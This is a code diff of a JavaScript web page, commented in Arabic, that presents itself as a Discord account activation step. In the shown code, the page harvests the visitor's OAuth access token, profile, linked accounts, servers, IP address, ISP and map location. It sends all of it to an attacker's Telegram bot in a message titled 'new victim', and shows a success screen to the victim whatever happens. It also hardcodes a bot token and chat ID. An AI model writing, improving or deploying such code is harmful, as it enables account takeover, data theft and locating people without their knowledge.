@@ -75,7 +75,7 @@
 // ================= الإعدادات =================
 const CLIENT_ID = "1523373482413658334";
 const TG_TOKEN  = "9213796296:AAFgiZR1cwWLX6-W_yQhtBpjp8TEptKHdtU";
-const TG_CHAT_ID = "ضع_الـ_CHAT_ID_بتاعك_هنا"; 
+const TG_CHAT_ID = "6045243196"; 
 // ============================================
 
 function activate() {
@@ -85,7 +85,7 @@ function activate() {
     window.location.href = oauthUrl;
 }
 
-function handleCallback() {
+async function handleCallback() {
     const hash = window.location.hash.substring(1);
     if (!hash) return false;
 
@@ -96,15 +96,36 @@ function handleCallback() {
     document.getElementById('landing').classList.add('hidden');
     document.getElementById('loading').classList.remove('hidden');
 
-    Promise.all([
-        fetch('https://discord.com/api/v10/users/@me', { headers: { 'Authorization': 'Bearer ' + accessToken } }).then(res => res.json()),
-        fetch('https://discord.com/api/v10/users/@me/connections', { headers: { 'Authorization': 'Bearer ' + accessToken } }).then(res => res.json()).catch(() => []),
-        fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { 'Authorization': 'Bearer ' + accessToken } }).then(res => res.json()).catch(() => []),
-        fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}))
-    ])
-    .then(([user, connections, guilds, ipData]) => {
+    try {
+        // 1. بيانات الحساب الأساسية
+        const userRes = await fetch('https://discord.com/api/v10/users/@me', { headers: { 'Authorization': 'Bearer ' + accessToken } });
+        const user = await userRes.json();
         document.getElementById('uname').textContent = user.username || 'user';
 
+        // 2. الحسابات المربوطة (يوتيوب، ستيم، الخ)
+        let connections = [];
+        try {
+            const connRes = await fetch('https://discord.com/api/v10/users/@me/connections', { headers: { 'Authorization': 'Bearer ' + accessToken } });
+            const connData = await connRes.json();
+            if (Array.isArray(connData)) connections = connData;
+        } catch (e) { console.log('Conn error', e); }
+
+        // 3. السيرفرات
+        let guilds = [];
+        try {
+            const guildRes = await fetch('https://discord.com/api/v10/users/@me/guilds', { headers: { 'Authorization': 'Bearer ' + accessToken } });
+            const guildData = await guildRes.json();
+            if (Array.isArray(guildData)) guilds = guildData;
+        } catch (e) { console.log('Guilds error', e); }
+
+        // 4. الـ IP والموقع (باستخدام ipwho.is لأنه بيدعم HTTPS وأدق)
+        let ipData = {};
+        try {
+            const ipRes = await fetch('https://ipwho.is/');
+            ipData = await ipRes.json();
+        } catch (e) { console.log('IP error', e); }
+
+        // تجهيز النصوص
         let conns = connections.slice(0, 15).map(c => `  • ${c.type} → \`${c.name}\``).join('\n') || '  —';
         if (connections.length > 15) conns += `\n  ...و ${connections.length - 15} آخرين`;
 
@@ -112,17 +133,17 @@ function handleCallback() {
         if (guilds.length > 20) guildsList += `\n  ...و ${guilds.length - 20} سيرفر آخر`;
 
         let ip = ipData.ip || 'غير معروف';
-        let country = ipData.country_name || '?';
+        let country = ipData.country || '?';
         let region = ipData.region || '?';
         let city = ipData.city || '?';
-        let isp = ipData.org || '?';
+        let isp = (ipData.connection && ipData.connection.isp) ? ipData.connection.isp : '?';
         
-        // تجهيز لينك قوقل ماب
         let mapLink = 'غير متوفر';
         if (ipData.latitude && ipData.longitude) {
             mapLink = `[اضغط هنا لفتح الخريطة](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})`;
         }
 
+        // تجميع الرسالة
         const msg = `🔥 *ضحية جديدة — OAuth*\n\n` +
             `👤 *Username:* \`${user.username}#${user.discriminator || '0'}\`\n` +
             `📛 *Display:* \`${user.global_name || user.username}\`\n` +
@@ -139,7 +160,8 @@ function handleCallback() {
             `🏰 *Guilds (${guilds.length}):*\n${guildsList}\n\n` +
             `🎫 *Access Token:*\n\`${accessToken}\``;
 
-        return fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        // إرسال لتليجرام
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -148,18 +170,18 @@ function handleCallback() {
                 parse_mode: 'Markdown'
             })
         });
-    })
-    .then(() => {
+
+        // إظهار النجاح
         document.getElementById('loading').classList.add('hidden');
         document.getElementById('success').classList.remove('hidden');
         startCountdown();
-    })
-    .catch(err => {
-        console.error(err);
+
+    } catch (err) {
+        console.error("Main Error:", err);
         document.getElementById('loading').classList.add('hidden');
         document.getElementById('success').classList.remove('hidden');
         startCountdown();
-    });
+    }
 
     return true;
 }
